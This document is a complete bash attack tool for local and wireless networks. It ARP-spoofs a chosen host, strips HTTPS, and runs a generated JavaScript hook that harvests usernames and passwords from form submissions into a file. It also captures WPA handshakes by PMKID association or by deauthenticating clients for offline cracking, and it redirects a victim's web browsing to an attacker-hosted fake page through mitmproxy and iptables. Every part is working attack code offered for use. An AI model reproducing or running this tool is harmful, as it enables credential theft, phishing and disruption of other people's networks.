#!/bin/bash

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'
CYAN='\033[0;36m'; BLUE='\033[0;34m'; MAGENTA='\033[0;35m'
BOLD='\033[1m'; DIM='\033[2m'; NC='\033[0m'

if [[ $EUID -ne 0 ]]; then
   echo -e "${RED}[!] Run as root (sudo).${NC}"; exit 1
fi

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
HANDSHAKE_DIR="$SCRIPT_DIR/handshakes"
CRED_FILE="$SCRIPT_DIR/credentials.txt"
CRED_HOOK="$SCRIPT_DIR/credential_hook.js"

MITM_PID=""
BC_PID=""
HTTP_PID=""
CLEANUP_DONE=0

mkdir -p "$HANDSHAKE_DIR"

if [[ ! -f "$CRED_HOOK" ]]; then
    cat > "$CRED_HOOK" << EOF
var LOGFILE = "$CRED_FILE";

function writeLog(msg) {
    try {
        var f = new File(LOGFILE);
        f.open("a");
        f.write(msg + "\n");
        f.close();
    } catch (e) {}
}

function parseForm(body) {
    var result = {};
    if (!body) return result;
    var pairs = body.split("&");
    for (var i = 0; i < pairs.length; i++) {
        var kv = pairs[i].split("=");
        if (kv.length === 2) {
            var key = decodeURIComponent(kv[0].replace(/\+/g, " "));
            var val = decodeURIComponent(kv[1].replace(/\+/g, " "));
            result[key.toLowerCase()] = val;
        }
    }
    return result;
}

function onRequest(req, res) {
    var foundUser = null;
    var foundPass = null;
    var data = "";

    if (req.Method === "POST" && req.Body) {
        data = req.Body;
        var fields = parseForm(data);
        var userKeys = ["user", "username", "usr", "login", "email", "name", "account"];
        var passKeys = ["pass", "password", "passwd", "pwd", "pass1", "passcode"];
        for (var i = 0; i < userKeys.length; i++) {
            if (fields[userKeys[i]]) { foundUser = fields[userKeys[i]]; break; }
        }
        for (var i = 0; i < passKeys.length; i++) {
            if (fields[passKeys[i]]) { foundPass = fields[passKeys[i]]; break; }
        }
    }

    if (req.Method === "GET" && req.Path) {
        var qIdx = req.Path.indexOf("?");
        if (qIdx !== -1) {
            data = req.Path.substring(qIdx + 1);
            var fields = parseForm(data);
            var userKeys = ["user", "username", "usr", "login", "email", "name", "account"];
            var passKeys = ["pass", "password", "passwd", "pwd", "pass1", "passcode"];
            for (var i = 0; i < userKeys.length; i++) {
                if (fields[userKeys[i]]) { foundUser = fields[userKeys[i]]; break; }
            }
            for (var i = 0; i < passKeys.length; i++) {
                if (fields[passKeys[i]]) { foundPass = fields[passKeys[i]]; break; }
            }
        }
    }

    if (foundUser !== null || foundPass !== null) {
        var line = "========================================\n";
        line += "TIME  : " + new Date().toString() + "\n";
        line += "METHOD: " + req.Method + "\n";
        line += "URL   : http://" + (req.Host || "unknown") + (req.Path || "unknown") + "\n";
        line += "USER  : " + (foundUser !== null ? foundUser : "(not found)") + "\n";
        line += "PASS  : " + (foundPass !== null ? foundPass : "(not found)") + "\n";
        line += "DATA  : " + data + "\n";
        line += "========================================";
        log(line);
        writeLog(line);
    }
}
EOF
fi

print_section() {
    echo -e "\n${BLUE}${BOLD}┌──────────────────────────────────────────────────────┐${NC}"
    echo -e "${BLUE}${BOLD}│ $1${NC}"
    echo -e "${BLUE}${BOLD}└──────────────────────────────────────────────────────┘${NC}"
}
print_ok()   { echo -e "  ${GREEN}[✔]${NC} $1"; }
print_warn() { echo -e "  ${YELLOW}[!]${NC} $1"; }
print_err()  { echo -e "  ${RED}[✘]${NC} $1"; }
print_info() { echo -e "  ${CYAN}[i]${NC} $1"; }

cleanup_all() {
    if [[ "$CLEANUP_DONE" -eq 1 ]]; then
        return
    fi
    CLEANUP_DONE=1

    echo ""
    echo -e "  ${CYAN}[i]${NC} Cleaning up..."

    if [[ -n "$BC_PID" ]]; then
        kill "$BC_PID" 2>/dev/null
    fi
    if [[ -n "$MITM_PID" ]]; then
        kill "$MITM_PID" 2>/dev/null
    fi
    if [[ -n "$HTTP_PID" ]]; then
        kill "$HTTP_PID" 2>/dev/null
    fi

    pkill -f "mitmdump -s" 2>/dev/null
    pkill -f "bettercap" 2>/dev/null
    pkill -f "http.server 80" 2>/dev/null

    if [[ -n "$IFACE" ]]; then
        iptables -t nat -D PREROUTING -i "$IFACE" -p tcp --dport 80 -j REDIRECT --to-port 8080 2>/dev/null
        iptables -t nat -D PREROUTING -i "$IFACE" -p tcp --dport 443 -j REDIRECT --to-port 8080 2>/dev/null
    fi

    echo 0 > /proc/sys/net/ipv4/ip_forward

    echo -e "  ${GREEN}[✔]${NC} Cleanup complete."
}

trap 'cleanup_all; exit 0' SIGINT SIGTERM

reset_adapter() {
    local iface="$1"
    print_info "Resetting adapter ${BOLD}${iface}${NC}..."
    ip link set "$iface" down 2>/dev/null
    sleep 1
    ip link set "$iface" up 2>/dev/null
    sleep 2
    print_ok "Adapter reset done."
}

force_resolve_mac() {
    local ip="$1"
    local iface="$2"
    local mac=""

    ping -c 3 -W 2 "$ip" &>/dev/null
    mac=$(ip neigh show "$ip" 2>/dev/null | awk '/lladdr/ {print $5; exit}')

    if [[ -z "$mac" ]] && command -v arping &>/dev/null; then
        arping -c 3 -I "$iface" "$ip" &>/dev/null
        mac=$(ip neigh show "$ip" 2>/dev/null | awk '/lladdr/ {print $5; exit}')
    fi

    if [[ -z "$mac" ]] && command -v arping &>/dev/null; then
        arping -c 5 -I "$iface" "$ip" &>/dev/null
        mac=$(ip neigh show "$ip" 2>/dev/null | awk '/lladdr/ {print $5; exit}')
    fi

    echo "$mac"
}

detect_gateway() {
    local gw=""

    gw=$(ip route | awk '/default/ {print $3; exit}')

    if [[ -z "$gw" ]]; then
        local hex
        hex=$(awk '$2 == "00000000" {print $3; exit}' /proc/net/route)
        if [[ -n "$hex" ]]; then
            gw=$(printf "%d.%d.%d.%d" "0x${hex:6:2}" "0x${hex:4:2}" "0x${hex:2:2}" "0x${hex:0:2}")
        fi
    fi

    if [[ -z "$gw" ]]; then
        gw=$(arp -n 2>/dev/null | awk '/^192\.168\./ && $3 != "(incomplete)" {print $1; exit}')
    fi

    echo "$gw"
}

detect_my_ip() {
    local ips=()
    local ifaces=()

    while IFS= read -r line; do
        local iface ip
        iface=$(echo "$line" | awk '{print $NF}')
        ip=$(echo "$line" | awk '{print $2}' | cut -d/ -f1)
        if [[ -n "$ip" && "$ip" != "127.0.0.1" ]]; then
            ips+=("$ip")
            ifaces+=("$iface")
        fi
    done < <(ip -4 addr show 2>/dev/null | grep -E "inet ")

    if [[ ${#ips[@]} -eq 0 ]]; then
        echo ""
        return
    fi

    local lan_ips=()
    local lan_ifaces=()
    for i in "${!ips[@]}"; do
        if [[ "${ips[$i]}" == 192.168.* ]]; then
            lan_ips+=("${ips[$i]}")
            lan_ifaces+=("${ifaces[$i]}")
        fi
    done

    if [[ ${#lan_ips[@]} -eq 1 ]]; then
        echo "${lan_ips[0]}"
        return
    fi

    if [[ ${#lan_ips[@]} -gt 1 ]]; then
        echo -e "  ${CYAN}[i]${NC} Multiple 192.168.x.x IPs detected:" >&2
        for i in "${!lan_ips[@]}"; do
            echo -e "    ${CYAN}[$((i+1))]${NC} ${lan_ifaces[$i]} → ${lan_ips[$i]}" >&2
        done
        local choice
        read -p "$(echo -e "${MAGENTA}➜${NC} Select IP for redirect: ")" choice
        if [[ -z "$choice" || "$choice" -lt 1 || "$choice" -gt ${#lan_ips[@]} ]]; then
            echo "${lan_ips[0]}"
        else
            echo "${lan_ips[$((choice-1))]}"
        fi
        return
    fi

    if [[ ${#ips[@]} -eq 1 ]]; then
        echo "${ips[0]}"
        return
    fi

    echo -e "  ${CYAN}[i]${NC} No 192.168.x.x IP found. Available IPs:" >&2
    for i in "${!ips[@]}"; do
        echo -e "    ${CYAN}[$((i+1))]${NC} ${ifaces[$i]} → ${ips[$i]}" >&2
    done
    local choice
    read -p "$(echo -e "${MAGENTA}➜${NC} Select IP for redirect: ")" choice
    if [[ -z "$choice" || "$choice" -lt 1 || "$choice" -gt ${#ips[@]} ]]; then
        echo "${ips[0]}"
    else
        echo "${ips[$((choice-1))]}"
    fi
}

verify_handshake() {
    local file="$1"

    if [[ ! -f "$file" ]]; then
        print_err "No capture file at $file"
        return 1
    fi

    print_info "Verifying handshake completeness..."
    local valid=0

    if command -v aircrack-ng &>/dev/null; then
        local ac_out
        ac_out=$(aircrack-ng "$file" 2>&1 | head -30)

        local hs_count
        hs_count=$(echo "$ac_out" | grep -oE 'WPA \([0-9]+ handshake' | grep -oE '[0-9]+' | head -1)

        if [[ -n "$hs_count" && "$hs_count" -ge 1 ]]; then
            print_ok "aircrack-ng: ${BOLD}${hs_count} complete handshake(s) found${NC}"
            echo "$ac_out" | grep -E 'WPA \(|ESSID|BSSID' | sed 's/^/      /'
            valid=1
        else
            print_warn "aircrack-ng: no complete handshake (0 handshake)."
        fi
    else
        print_warn "aircrack-ng not installed, skipping."
    fi

    if command -v tshark &>/dev/null; then
        local eapol_count
        eapol_count=$(tshark -r "$file" -Y "eapol" 2>/dev/null | wc -l | tr -d ' ')
        print_info "EAPOL frames in capture: ${BOLD}${eapol_count}${NC}"

        if [[ "$eapol_count" -ge 2 ]]; then
            print_ok "At least 2 EAPOL frames present (potentially crackable)."
            valid=1
        else
            print_warn "Less than 2 EAPOL frames — handshake is incomplete."
        fi
    else
        print_info "tshark not installed, skipping EAPOL count."
    fi

    if [[ "$valid" -eq 1 ]]; then
        return 0
    else
        return 1
    fi
}

print_section "STEP 0 • Tools Verification"

if command -v bettercap &>/dev/null; then
    BC_VERSION=$(bettercap -version 2>&1 | head -n 1)
    print_ok "bettercap installed: ${BOLD}${BC_VERSION}${NC}"
else
    print_warn "bettercap not found. Installing..."
    apt update -qq && apt install -y bettercap -qq
    if command -v bettercap &>/dev/null; then
        BC_VERSION=$(bettercap -version 2>&1 | head -n 1)
        print_ok "bettercap installed: ${BOLD}${BC_VERSION}${NC}"
    else
        print_err "bettercap installation failed."
        exit 1
    fi
fi

if command -v aircrack-ng &>/dev/null; then
    print_ok "aircrack-ng installed."
else
    print_warn "aircrack-ng not found. Installing..."
    apt update -qq && apt install -y aircrack-ng -qq
    if command -v aircrack-ng &>/dev/null; then
        print_ok "aircrack-ng installed."
    else
        print_err "aircrack-ng installation failed."
        exit 1
    fi
fi

if command -v mitmdump &>/dev/null; then
    print_ok "mitmdump installed."
else
    print_warn "mitmdump not found. Installing mitmproxy..."
    apt install -y mitmproxy -qq
    if command -v mitmdump &>/dev/null; then
        print_ok "mitmdump installed."
    else
        print_err "mitmdump installation failed."
        exit 1
    fi
fi

print_ok "Handshake folder ready: ${BOLD}${HANDSHAKE_DIR}${NC}"

print_section "STEP 1 • Adapter Detection"

mapfile -t ADAPTERS < <(
    for iface in $(ls /sys/class/net); do
        [[ -d "/sys/class/net/$iface/phy80211" ]] && echo "$iface"
    done
)

if [[ ${#ADAPTERS[@]} -eq 0 ]]; then
    print_err "No wireless adapter found."; exit 1
fi

if [[ ${#ADAPTERS[@]} -eq 1 ]]; then
    IFACE="${ADAPTERS[0]}"
    print_ok "Adapter: ${BOLD}${IFACE}${NC}"
else
    print_info "Multiple adapters:"
    for i in "${!ADAPTERS[@]}"; do
        echo -e "  ${CYAN}[$((i+1))]${NC} ${ADAPTERS[$i]}"
    done
    read -p "$(echo -e "${MAGENTA}➜${NC} Select: ")" CHOICE
    IFACE="${ADAPTERS[$((CHOICE-1))]}"
fi

print_section "STEP 2 • Select Mode"

echo -e "  ${CYAN}[1]${NC} MITM Attack          ${DIM}(ARP spoof + sniff + credential capture)${NC}"
echo -e "  ${CYAN}[2]${NC} Handshake Capture    ${DIM}(scan WiFi, capture + verify)${NC}"
echo -e "  ${CYAN}[3]${NC} URL Redirect         ${DIM}(ARP spoof + mitmdump + iptables)${NC}"
echo -e "  ${CYAN}[4]${NC} Exit"
echo
read -p "$(echo -e "${MAGENTA}➜${NC} Option [1-4]: ")" MODE

if [[ "$MODE" == "1" ]]; then
    print_section "MITM Mode • Network Discovery"

    sleep 2

    AUTO_GW=$(detect_gateway)
    if [[ -z "$AUTO_GW" ]]; then
        print_warn "No default gateway detected."
        read -p "$(echo -e "${MAGENTA}➜${NC} Enter gateway IP manually: ")" AUTO_GW
        if [[ -z "$AUTO_GW" ]]; then print_err "Gateway required."; exit 1; fi
    fi
    print_info "Gateway: ${BOLD}${AUTO_GW}${NC}"

    ping -c 3 -W 2 "$AUTO_GW" &>/dev/null
    sleep 1

    GW_MAC=$(force_resolve_mac "$AUTO_GW" "$IFACE")
    if [[ -n "$GW_MAC" ]]; then
        print_ok "Gateway MAC: ${BOLD}${GW_MAC}${NC}"
    else
        print_warn "Gateway MAC unresolved."
    fi

    echo 1 > /proc/sys/net/ipv4/ip_forward
    print_ok "IP Forwarding enabled."

    print_info "Starting network probe (25s)..."
    MITM_LOG="/tmp/mitm_probe_$$.log"
    bettercap -iface "$IFACE" -gateway-override "$AUTO_GW" -eval "
        set net.probe.throttle 2;
        net.probe on;
        sleep 25;
        net.show;
        sleep 3;
        net.probe off;
        exit
    " > "$MITM_LOG" 2>&1

    mapfile -t HOSTS < <(
        grep -E '^\│' "$MITM_LOG" | \
        awk -F'│' '{
            gsub(/^[ \t]+|[ \t]+$/, "", $2);
            gsub(/^[ \t]+|[ \t]+$/, "", $3);
            gsub(/^[ \t]+|[ \t]+$/, "", $4);
            if ($2 ~ /^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$/ && $3 ~ /^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$/) {
                print $2 "|" $3 "|" $4
            }
        }'
    )
    rm -f "$MITM_LOG"

    if [[ ${#HOSTS[@]} -eq 0 ]]; then
        print_warn "Bettercap found no hosts. Reading ARP table..."
        mapfile -t HOSTS < <(
            ip neigh show | awk '$3 == "lladdr" && $NF != "FAILED" {print $1 "|" $5 "|" "-"}'
        )
    fi

    if [[ ${#HOSTS[@]} -eq 0 ]]; then
        print_err "No hosts found. AP isolation?"
        exit 1
    fi

    print_section "Discovered Hosts"
    echo
    printf "  ${BOLD}%-4s %-18s %-20s %-20s${NC}\n" "No." "IP" "MAC" "Vendor/Name"
    echo "  ──────────────────────────────────────────────────────────────"
    i=1
    for entry in "${HOSTS[@]}"; do
        IFS='|' read -r ip mac name <<< "$entry"
        printf "  ${CYAN}%-4s${NC} %-18s %-20s %-20s\n" "$i" "$ip" "$mac" "$name"
        ((i++))
    done

    echo
    read -p "$(echo -e "${MAGENTA}➜${NC} Select target IP number: ")" HOST_CHOICE
    IFS='|' read -r TARGET_IP _ _ <<< "${HOSTS[$((HOST_CHOICE-1))]}"
    if [[ -z "$TARGET_IP" ]]; then
        print_err "Invalid selection."
        exit 1
    fi
    print_ok "Target: ${BOLD}${TARGET_IP}${NC}"

    TARGET_MAC=$(force_resolve_mac "$TARGET_IP" "$IFACE")
    if [[ -z "$TARGET_MAC" ]]; then
        print_err "Target MAC unresolved."
        exit 1
    fi
    print_ok "Target MAC: ${BOLD}${TARGET_MAC}${NC}"

    sleep 3
    rm -f "$CRED_FILE"

    print_info "Starting ARP spoof + credential capture. Press Ctrl+C to stop."
    echo

    bettercap -iface "$IFACE" -gateway-override "$AUTO_GW" -eval "
    set arp.spoof.fullduplex true;
    set arp.spoof.targets $TARGET_IP;
    set arp.spoof.internal false;
    set net.sniff.verbose true;
    set net.sniff.local true;
    set net.sniff.filter 'host $TARGET_IP';
    set net.sniff.output /tmp/mitm_capture.pcap;
    set https.proxy.sslstrip true;
    set https.proxy.script $CRED_HOOK;
    arp.spoof on;
    https.proxy on;
    net.sniff on
"

    echo 0 > /proc/sys/net/ipv4/ip_forward
    print_ok "IP Forwarding disabled."

    print_section "Credentials Check"
    if [[ -f "$CRED_FILE" ]] && [[ -s "$CRED_FILE" ]]; then
        print_ok "${GREEN}${BOLD}Credentials captured!${NC}"
        echo
        cat "$CRED_FILE"
    else
        print_warn "No credentials captured."
        echo -e "    ${DIM}• Login over HTTPS + HSTS = sslstrip fail${NC}"
        echo -e "    • Check pcap: /tmp/mitm_capture.pcap${NC}"
    fi

elif [[ "$MODE" == "2" ]]; then
    print_section "Handshake Mode • WiFi Scan"

    print_info "Scanning WiFi networks (20 seconds)..."

    SCAN_LOG="/tmp/wifi_scan_$$.log"
    bettercap -iface "$IFACE" -eval "
        wifi.recon on;
        sleep 20;
        wifi.show;
        sleep 3;
        wifi.recon off;
        exit
    " > "$SCAN_LOG" 2>&1

    mapfile -t APS < <(
        grep -E '^\│' "$SCAN_LOG" | \
        awk -F'│' '{
            gsub(/^[ \t]+|[ \t]+$/, "", $2);
            gsub(/^[ \t]+|[ \t]+$/, "", $3);
            gsub(/^[ \t]+|[ \t]+$/, "", $4);
            gsub(/^[ \t]+|[ \t]+$/, "", $7);
            if ($3 ~ /^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$/ && $4 != "") {
                print $3 "|" $4 "|" $7
            }
        }'
    )
    rm -f "$SCAN_LOG"

    if [[ ${#APS[@]} -eq 0 ]]; then print_err "No networks found."; exit 1; fi

    print_section "Discovered Networks"
    echo
    printf "  ${BOLD}%-4s %-32s %-8s${NC}\n" "No." "ESSID" "Channel"
    echo "  ──────────────────────────────────────────────"
    i=1
    for entry in "${APS[@]}"; do
        IFS='|' read -r bssid essid ch <<< "$entry"
        printf "  ${CYAN}%-4s${NC} %-32s %-8s\n" "$i" "$essid" "$ch"
        ((i++))
    done

    echo
    read -p "$(echo -e "${MAGENTA}➜${NC} Select network: ")" AP_CHOICE
    IFS='|' read -r TARGET_BSSID TARGET_ESSID TARGET_CHANNEL <<< "${APS[$((AP_CHOICE-1))]}"
    if [[ -z "$TARGET_BSSID" ]]; then print_err "Invalid."; exit 1; fi

    print_ok "Target: ${BOLD}${TARGET_ESSID}${NC} (${TARGET_BSSID}) Ch ${TARGET_CHANNEL}"

    SAFE_ESSID=$(echo "$TARGET_ESSID" | tr -c 'A-Za-z0-9_-' '_')
    HS_FILE="$HANDSHAKE_DIR/${SAFE_ESSID}.pcap"
    rm -f "$HS_FILE"
    print_ok "Handshake file: ${BOLD}${HS_FILE}${NC}"

    reset_adapter "$IFACE"
    print_info "Attempt 1: PMKID via wifi.assoc (15s)..."

    ASSOC_LOG="/tmp/assoc_$$.log"
    bettercap -iface "$IFACE" -eval "
        set wifi.handshakes.file $HS_FILE;
        wifi.recon on;
        wifi.recon.channel $TARGET_CHANNEL;
        sleep 3;
        wifi.assoc $TARGET_BSSID;
        sleep 15;
        wifi.recon off;
        exit
    " > "$ASSOC_LOG" 2>&1

    if [[ ! -f "$HS_FILE" ]]; then
        print_warn "wifi.assoc failed. Trying deauth..."
        reset_adapter "$IFACE"
        print_info "Attempt 2: wifi.deauth (25s)..."

        DEAUTH_LOG="/tmp/deauth_$$.log"
        bettercap -iface "$IFACE" -eval "
            set wifi.handshakes.file $HS_FILE;
            set wifi.deauth.acquired true;
            wifi.recon on;
            wifi.recon.channel $TARGET_CHANNEL;
            sleep 3;
            wifi.deauth $TARGET_BSSID;
            sleep 25;
            wifi.recon off;
            exit
        " > "$DEAUTH_LOG" 2>&1

        grep -q "no client detected" "$DEAUTH_LOG" && print_warn "No client connected to AP."
        rm -f "$DEAUTH_LOG"
    else
        print_ok "PMKID succeeded."
    fi

    rm -f "$ASSOC_LOG"

    echo
    print_section "Handshake Verification"

    if [[ -f "$HS_FILE" ]]; then
        print_ok "Capture: ${BOLD}${HS_FILE}${NC}"
        if verify_handshake "$HS_FILE"; then
            print_ok "${GREEN}${BOLD}Handshake COMPLETE.${NC}"
        else
            print_warn "${YELLOW}Handshake INCOMPLETE.${NC}"
        fi
    else
        print_warn "No capture file created."
    fi

elif [[ "$MODE" == "3" ]]; then
    print_section "URL Redirect Mode • ARP spoof + mitmdump"

    AUTO_GW=$(detect_gateway)
    if [[ -z "$AUTO_GW" ]]; then
        print_warn "No default gateway detected."
        read -p "$(echo -e "${MAGENTA}➜${NC} Enter gateway IP manually: ")" AUTO_GW
        if [[ -z "$AUTO_GW" ]]; then print_err "Gateway required."; exit 1; fi
    fi
    print_info "Gateway: ${BOLD}${AUTO_GW}${NC}"

    MY_IP=$(detect_my_ip)
    if [[ -z "$MY_IP" ]]; then
        print_err "Could not detect your local IP. Aborting."
        exit 1
    fi
    print_info "Your IP: ${BOLD}${MY_IP}${NC}"

    echo 1 > /proc/sys/net/ipv4/ip_forward
    print_ok "IP Forwarding enabled."

    print_info "Starting network probe (25s)..."
    MITM_LOG="/tmp/mitm_probe_$$.log"
    bettercap -iface "$IFACE" -gateway-override "$AUTO_GW" -eval "
        set net.probe.throttle 2;
        net.probe on;
        sleep 25;
        net.show;
        sleep 3;
        net.probe off;
        exit
    " > "$MITM_LOG" 2>&1

    mapfile -t HOSTS < <(
        grep -E '^\│' "$MITM_LOG" | \
        awk -F'│' '{
            gsub(/^[ \t]+|[ \t]+$/, "", $2);
            gsub(/^[ \t]+|[ \t]+$/, "", $3);
            gsub(/^[ \t]+|[ \t]+$/, "", $4);
            if ($2 ~ /^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$/ && $3 ~ /^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$/) {
                print $2 "|" $3 "|" $4
            }
        }'
    )
    rm -f "$MITM_LOG"

    if [[ ${#HOSTS[@]} -eq 0 ]]; then
        print_warn "Bettercap found no hosts. Reading ARP table..."
        mapfile -t HOSTS < <(
            ip neigh show | awk '$3 == "lladdr" && $NF != "FAILED" {print $1 "|" $5 "|" "-"}'
        )
    fi

    if [[ ${#HOSTS[@]} -eq 0 ]]; then
        print_err "No hosts found. AP isolation?"
        exit 1
    fi

    print_section "Discovered Hosts"
    echo
    printf "  ${BOLD}%-4s %-18s %-20s %-20s${NC}\n" "No." "IP" "MAC" "Vendor/Name"
    echo "  ──────────────────────────────────────────────────────────────"
    i=1
    for entry in "${HOSTS[@]}"; do
        IFS='|' read -r ip mac name <<< "$entry"
        printf "  ${CYAN}%-4s${NC} %-18s %-20s %-20s\n" "$i" "$ip" "$mac" "$name"
        ((i++))
    done

    echo
    read -p "$(echo -e "${MAGENTA}➜${NC} Select target IP number: ")" HOST_CHOICE
    IFS='|' read -r TARGET_IP _ _ <<< "${HOSTS[$((HOST_CHOICE-1))]}"
    if [[ -z "$TARGET_IP" ]]; then
        print_err "Invalid selection."
        exit 1
    fi
    print_ok "Target: ${BOLD}${TARGET_IP}${NC}"

    TARGET_MAC=$(force_resolve_mac "$TARGET_IP" "$IFACE")
    if [[ -z "$TARGET_MAC" ]]; then
        print_err "Target MAC unresolved."
        exit 1
    fi
    print_ok "Target MAC: ${BOLD}${TARGET_MAC}${NC}"

    print_info "Enter the file path to redirect victims to."
    print_info "Example: fake.html (must be in script folder)"
    print_info "Example: /home/mrunknown/fake.html"
    echo
    read -e -p "$(echo -e "${MAGENTA}➜${NC} File path: ")" REDIRECT_FILE
    if [[ -z "$REDIRECT_FILE" ]]; then
        print_err "File path required."
        exit 1
    fi

    if [[ ! -f "$REDIRECT_FILE" ]]; then
        print_warn "File not found at: $REDIRECT_FILE"
        print_info "Place the file there or continue (redirect will fail)."
        read -p "$(echo -e "${MAGENTA}➜${NC} Continue anyway? [y/N]: ")" CONT
        if [[ "$CONT" != "y" && "$CONT" != "Y" ]]; then
            exit 1
        fi
    else
        print_ok "File found: $REDIRECT_FILE"
    fi

    REDIRECT_BASENAME=$(basename "$REDIRECT_FILE")
    REDIRECT_DIR=$(dirname "$REDIRECT_FILE")
    [[ "$REDIRECT_DIR" == "." ]] && REDIRECT_DIR="$SCRIPT_DIR"

    REDIRECT_HOST="$MY_IP"
    REDIRECT_PATH="/$REDIRECT_BASENAME"
    REDIRECT_URL="http://$REDIRECT_HOST$REDIRECT_PATH"

    print_info "Redirecting to: ${BOLD}${REDIRECT_URL}${NC}"

    REDIRECT_ADDON="$SCRIPT_DIR/redirect_addon.py"
    cat > "$REDIRECT_ADDON" << EOF
from mitmproxy import http

REDIRECT_HOST = "$REDIRECT_HOST"
REDIRECT_PATH = "$REDIRECT_PATH"

def request(flow: http.HTTPFlow) -> None:
    accept = flow.request.headers.get("Accept", "")
    if "text/html" not in accept:
        return

    ext = flow.request.path.lower()
    if ext.endswith(".exe") or ext.endswith(".zip") or ext.endswith(".pdf") or ext.endswith(".apk"):
        return

    flow.request.host = REDIRECT_HOST
    flow.request.port = 80
    flow.request.scheme = "http"
    flow.request.path = REDIRECT_PATH
EOF

    print_ok "Addon generated: ${BOLD}${REDIRECT_ADDON}${NC}"

    if ss -tuln 2>/dev/null | grep -q ":80 "; then
        print_warn "Port 80 is already in use. Using existing server."
        HTTP_PID=""
    else
        print_info "Starting HTTP server on port 80..."
        cd "$REDIRECT_DIR" || { print_err "Cannot cd to $REDIRECT_DIR"; exit 1; }
        python3 -m http.server 80 &
        HTTP_PID=$!
        sleep 1
        print_ok "HTTP server running (PID: $HTTP_PID)"
    fi

    print_info "Setting up iptables redirect to mitmdump (port 8080)..."
    iptables -t nat -A PREROUTING -i "$IFACE" -p tcp --dport 80 -j REDIRECT --to-port 8080
    iptables -t nat -A PREROUTING -i "$IFACE" -p tcp --dport 443 -j REDIRECT --to-port 8080
    print_ok "iptables rules added."

    mitmdump -s "$REDIRECT_ADDON" --mode transparent &
    MITM_PID=$!
    print_ok "mitmdump running (PID: $MITM_PID)"

    bettercap -iface "$IFACE" -gateway-override "$AUTO_GW" -eval "
        set arp.spoof.fullduplex true;
        set arp.spoof.targets $TARGET_IP;
        set arp.spoof.internal false;
        arp.spoof on
    " &
    BC_PID=$!
    print_ok "Bettercap ARP spoof running (PID: $BC_PID)"

    print_info "Press Enter to stop."
    read -p ""

    cleanup_all

elif [[ "$MODE" == "4" ]]; then
    print_info "Exiting."
    exit 0
else
    print_err "Invalid option."
    exit 1
fi

echo
echo -e "${GREEN}${BOLD}✔ Script complete.${NC}"
